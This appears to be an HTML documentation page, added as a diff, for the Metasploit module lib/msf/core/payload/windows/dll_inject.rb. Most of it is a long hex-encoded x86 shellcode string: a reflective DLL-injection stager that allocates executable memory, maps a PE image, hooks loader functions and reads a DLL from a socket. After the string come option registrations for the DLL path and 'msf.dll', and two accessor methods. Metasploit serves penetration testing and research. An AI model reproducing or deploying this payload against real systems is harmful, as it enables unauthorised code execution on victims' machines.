+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x14\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x8b\x45\xfc\xff\x90\x8c\x01\x00\x00\xc9</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xc2\x1c\x00\x55\x8b\xec\x51\xe8\xf3\xfd\xff\xff\x89\x45\xfc\x8b\x45\xfc\x8b\x4d</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x08\x3b\x88\x10\x01\x00\x00\x75\x15\x8b\x45\x10\x8b\x4d\xfc\x8b\x89\x10\x01\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x89\x08\xb8\x03\x00\x00\x40\xeb\x27\xff\x75\x2c\xff\x75\x28\xff\x75\x24\xff</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x75\x20\xff\x75\x1c\xff\x75\x18\xff\x75\x14\xff\x75\x10\xff\x75\x0c\xff\x75\x08</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x45\xfc\xff\x90\x90\x01\x00\x00\xc9\xc2\x28\x00\x55\x8b\xec\x83\xec\x28\xc7</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\xd8\x05\x00\x00\x00\x8d\x45\xdc\x50\xff\x75\xd8\xff\x75\x0c\xff\x75\x10\x6a</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\x8b\x45\x08\xff\x90\x7c\x01\x00\x00\x8b\x45\x10\x03\x45\xd8\xc6\x00\xe9\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\x10\x83\xc0\x05\x8b\x4d\x0c\x2b\xc8\x8b\x45\x10\x03\x45\xd8\x89\x48\x01\x6a</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x1c\x8d\x45\xe4\x50\xff\x75\x0c\x8b\x45\x08\xff\x90\x70\x01\x00\x00\x8d\x45\xf8</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x50\x6a\x40\xff\x75\xf0\xff\x75\xe4\x8b\x45\x08\xff\x90\x74\x01\x00\x00\x8b\x45</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0c\xc6\x00\xe9\x8b\x45\x0c\x83\xc0\x05\x8b\x4d\x14\x2b\xc8\x8b\x45\x0c\x89\x48</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\x8d\x45\xe0\x50\xff\x75\xf8\xff\x75\xf0\xff\x75\xe4\x8b\x45\x08\xff\x90\x74</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\x00\x00\xff\x75\xf0\xff\x75\xe4\x6a\xff\x8b\x45\x08\xff\x90\x78\x01\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xc9\xc3\x55\x8b\xec\xb8\xec\x13\x40\x00\x2d\x00\x10\x40\x00\x8b\x4d\x08\x03\x81</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x08\x01\x00\x00\x50\x8b\x45\x08\x05\x3c\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x58</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\x00\x00\xff\x75\x08\xe8\x26\xff\xff\xff\x83\xc4\x10\x8b\x45\x08\x05\x3c\x01</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x00\x8b\x4d\x08\x89\x81\x90\x01\x00\x00\xb8\xbf\x12\x40\x00\x2d\x00\x10\x40</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x8b\x4d\x08\x03\x81\x08\x01\x00\x00\x50\x8b\x45\x08\x05\x1e\x01\x00\x00\x50</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x45\x08\xff\xb0\x4c\x01\x00\x00\xff\x75\x08\xe8\xe4\xfe\xff\xff\x83\xc4\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x45\x08\x05\x1e\x01\x00\x00\x8b\x4d\x08\x89\x81\x84\x01\x00\x00\xb8\x4f\x13</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x40\x00\x2d\x00\x10\x40\x00\x8b\x4d\x08\x03\x81\x08\x01\x00\x00\x50\x8b\x45\x08</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x05\x28\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x50\x01\x00\x00\xff\x75\x08\xe8\xa2</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xfe\xff\xff\x83\xc4\x10\x8b\x45\x08\x05\x28\x01\x00\x00\x8b\x4d\x08\x89\x81\x88</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\x00\x00\xb8\x9e\x13\x40\x00\x2d\x00\x10\x40\x00\x8b\x4d\x08\x03\x81\x08\x01</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x00\x50\x8b\x45\x08\x05\x32\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x54\x01\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\xff\x75\x08\xe8\x60\xfe\xff\xff\x83\xc4\x10\x8b\x45\x08\x05\x32\x01\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x4d\x08\x89\x81\x8c\x01\x00\x00\xb8\x77\x12\x40\x00\x2d\x00\x10\x40\x00\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x4d\x08\x03\x81\x08\x01\x00\x00\x50\x8b\x45\x08\x05\x14\x01\x00\x00\x50\x8b\x45</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x08\xff\xb0\x48\x01\x00\x00\xff\x75\x08\xe8\x1e\xfe\xff\xff\x83\xc4\x10\x8b\x45</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x08\x05\x14\x01\x00\x00\x8b\x4d\x08\x89\x81\x80\x01\x00\x00\x5d\xc3\x55\x8b\xec</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x83\xec\x28\xc7\x45\xd8\x05\x00\x00\x00\x6a\x1c\x8d\x45\xe4\x50\xff\x75\x0c\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\x08\xff\x90\x70\x01\x00\x00\x8d\x45\xf8\x50\x6a\x40\xff\x75\xf0\xff\x75\xe4</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x45\x08\xff\x90\x74\x01\x00\x00\x8d\x45\xdc\x50\xff\x75\xd8\xff\x75\x10\xff</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x75\x0c\x6a\xff\x8b\x45\x08\xff\x90\x7c\x01\x00\x00\x8d\x45\xe0\x50\xff\x75\xf8</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\x75\xf0\xff\x75\xe4\x8b\x45\x08\xff\x90\x74\x01\x00\x00\xff\x75\xf0\xff\x75</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe4\x6a\xff\x8b\x45\x08\xff\x90\x78\x01\x00\x00\xc9\xc3\x55\x8b\xec\x8b\x45\x08</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x05\x3c\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x58\x01\x00\x00\xff\x75\x08\xe8\x6e</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\xff\xff\x83\xc4\x0c\x8b\x45\x08\x05\x1e\x01\x00\x00\x50\x8b\x45\x08\xff\xb0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x4c\x01\x00\x00\xff\x75\x08\xe8\x51\xff\xff\xff\x83\xc4\x0c\x8b\x45\x08\x05\x28</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x50\x01\x00\x00\xff\x75\x08\xe8\x34\xff\xff</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\x83\xc4\x0c\x8b\x45\x08\x05\x32\x01\x00\x00\x50\x8b\x45\x08\xff\xb0\x54\x01</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x00\xff\x75\x08\xe8\x17\xff\xff\xff\x83\xc4\x0c\x8b\x45\x08\x05\x14\x01\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x50\x8b\x45\x08\xff\xb0\x48\x01\x00\x00\xff\x75\x08\xe8\xfa\xfe\xff\xff\x83</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xc4\x0c\x5d\xc3\x55\x8b\xec\x83\xec\x10\x8b\x45\x08\x8b\x80\x0c\x01\x00\x00\x89</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\xf0\x8b\x45\x08\x8b\x80\x0c\x01\x00\x00\x8b\x4d\xf0\x03\x41\x3c\x89\x45\xfc</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x40\x68\x00\x30\x00\x00\x8b\x45\xfc\xff\x70\x50\x8b\x45\xfc\xff\x70\x34\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\x08\xff\x90\x68\x01\x00\x00\x8b\x4d\x08\x89\x81\x10\x01\x00\x00\x8b\x45\x08</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x83\xb8\x10\x01\x00\x00\x00\x75\x21\x6a\x40\x68\x00\x30\x00\x00\x8b\x45\xfc\xff</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x70\x50\x6a\x00\x8b\x45\x08\xff\x90\x68\x01\x00\x00\x8b\x4d\x08\x89\x81\x10\x01</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x00\x6a\x00\x8b\x45\xfc\xff\x70\x54\x8b\x45\x08\xff\xb0\x0c\x01\x00\x00\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\x08\xff\xb0\x10\x01\x00\x00\x6a\xff\x8b\x45\x08\xff\x90\x7c\x01\x00\x00\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\xfc\x0f\xb7\x40\x14\x8b\x4d\xfc\x8d\x44\x01\x18\x89\x45\xf4\x83\x65\xf8\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xeb\x07\x8b\x45\xf8\x40\x89\x45\xf8\x8b\x45\xfc\x0f\xb7\x40\x06\x39\x45\xf8\x7d</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x4a\x6a\x00\x8b\x45\xf8\x6b\xc0\x28\x8b\x4d\xf4\xff\x74\x01\x10\x8b\x45\xf8\x6b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xc0\x28\x8b\x4d\x08\x8b\x89\x0c\x01\x00\x00\x8b\x55\xf4\x03\x4c\x02\x14\x51\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\xf8\x6b\xc0\x28\x8b\x4d\x08\x8b\x89\x10\x01\x00\x00\x8b\x55\xf4\x03\x4c\x02</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0c\x51\x6a\xff\x8b\x45\x08\xff\x90\x7c\x01\x00\x00\xeb\xa3\xc9\xc3\x55\x8b\xec</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x83\xec\x30\x8d\x45\xfc\x50\x6a\x40\x68\x98\x01\x00\x00\xff\x75\x08\x8b\x45\x08</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\x90\x74\x01\x00\x00\xc6\x45\xd4\x49\xc6\x45\xd5\x6e\xc6\x45\xd6\x69\xc6\x45</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xd7\x74\xc6\x45\xd8\x00\x6a\x00\x6a\x04\x8d\x45\xf0\x50\x8b\x45\x08\xff\x30\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\x08\xff\x90\x94\x01\x00\x00\x89\x45\xd0\x83\x7d\xd0\x00\x7f\x0b\x6a\x01\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\x08\xff\x90\x64\x01\x00\x00\x6a\x04\x68\x00\x10\x00\x00\xff\x75\xf0\x6a\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x45\x08\xff\x90\x68\x01\x00\x00\x8b\x4d\x08\x89\x81\x0c\x01\x00\x00\x8b\x45</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x08\x83\xb8\x0c\x01\x00\x00\x00\x75\x0b\x6a\x01\x8b\x45\x08\xff\x90\x64\x01\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x83\x65\xd0\x00\x83\x65\xf4\x00\x8b\x45\xf0\x89\x45\xe0\xeb\x12\x8b\x45\xe0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x2b\x45\xd0\x89\x45\xe0\x8b\x45\xf4\x03\x45\xd0\x89\x45\xf4\x83\x7d\xe0\x00\x7e</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x2d\x6a\x00\xff\x75\xe0\x8b\x45\x08\x8b\x80\x0c\x01\x00\x00\x03\x45\xf4\x50\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\x08\xff\x30\x8b\x45\x08\xff\x90\x94\x01\x00\x00\x89\x45\xd0\x83\x7d\xd0\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7d\x02\xeb\x02\xeb\xbb\x83\x65\xec\x00\xeb\x07\x8b\x45\xec\x40\x89\x45\xec\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\x08\x8b\x80\x0c\x01\x00\x00\x8b\x4d\xec\x0f\xbe\x04\x08\x85\xc0\x74\x1a\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\x08\x8b\x80\x0c\x01\x00\x00\x8b\x4d\x08\x03\x4d\xec\x8b\x55\xec\x8a\x04\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x88\x41\x04\xeb\xcb\x8b\x45\x08\x03\x45\xec\xc6\x40\x04\x00\x8b\x45\x08\x8b\x4d</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xec\x89\x88\x04\x01\x00\x00\x8b\x45\x08\x8b\x80\x0c\x01\x00\x00\x8b\x4d\xec\x8d</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\x01\x01\x8b\x4d\x08\x89\x81\x0c\x01\x00\x00\xff\x75\x08\xe8\x98\xfd\xff\xff</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x59\xb8\xe4\x11\x40\x00\x2d\x00\x10\x40\x00\x8b\x4d\x08\x8b\x89\x08\x01\x00\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x55\x08\x89\x14\x08\xff\x75\x08\xe8\x1c\xfb\xff\xff\x59\x8b\x45\x08\x83\xc0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x04\x50\x8b\x45\x08\xff\x90\x5c\x01\x00\x00\x89\x45\xe4\x83\x7d\xe4\x00\x75\x0b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x01\x8b\x45\x08\xff\x90\x64\x01\x00\x00\xff\x75\x08\xe8\xb3\xfc\xff\xff\x59</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8d\x45\xd4\x50\xff\x75\xe4\x8b\x45\x08\xff\x90\x60\x01\x00\x00\x89\x45\xf8\x83</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7d\xf8\x00\x74\x09\x8b\x45\x08\xff\x30\xff\x55\xf8\x59\x68\x00\x80\x00\x00\x6a</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x8b\x45\x08\x8b\x4d\x08\x8b\x80\x0c\x01\x00\x00\x2b\x81\x04\x01\x00\x00\x48</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x50\x8b\x45\x08\xff\x90\x6c\x01\x00\x00\x6a\x00\x8b\x45\x08\xff\x90\x64\x01\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x83\x65\x08\x00\x33\xc0\xc9\xc3</span><span class='tstring_end'>&quot;</span></span>
+
+      <span class='rbrace'>}</span>
+    <span class='rparen'>)</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_register_options'>register_options</span><span class='lparen'>(</span>
+    <span class='lbracket'>[</span>
+      <span class='const'><span class='object_link'><a href="../../OptPath.html" title="Msf::OptPath (class)">OptPath</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptBase.html#initialize-instance_method" title="Msf::OptBase#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>DLL</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>The local path to the DLL to upload</span><span class='tstring_end'>&quot;</span></span> <span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
+    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='const'><span class='object_link'><a href="" title="Msf::Payload::Windows::DllInject (module)">DllInject</a></span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_register_advanced_options'>register_advanced_options</span><span class='lparen'>(</span>
+    <span class='lbracket'>[</span>
+      <span class='const'><span class='object_link'><a href="../../OptString.html" title="Msf::OptString (class)">OptString</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptString.html#initialize-instance_method" title="Msf::OptString#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LibraryName</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>The symbolic name of the library to upload</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>msf.dll</span><span class='tstring_end'>&quot;</span></span> <span class='rbracket'>]</span><span class='rparen'>)</span>
+    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='const'><span class='object_link'><a href="" title="Msf::Payload::Windows::DllInject (module)">DllInject</a></span></span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="library_name-instance_method">
+  
+    #<strong>library_name</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the library name</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+189
+190
+191</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/dll_inject.rb', line 189</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_library_name'>library_name</span>
+  <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LibraryName</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>msf.dll</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="library_path-instance_method">
+  
+    #<strong>library_path</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns the library path</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+196
+197
+198</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/dll_inject.rb', line 196</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_library_path'>library_path</span>
+  <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>DLL</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:31:25 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
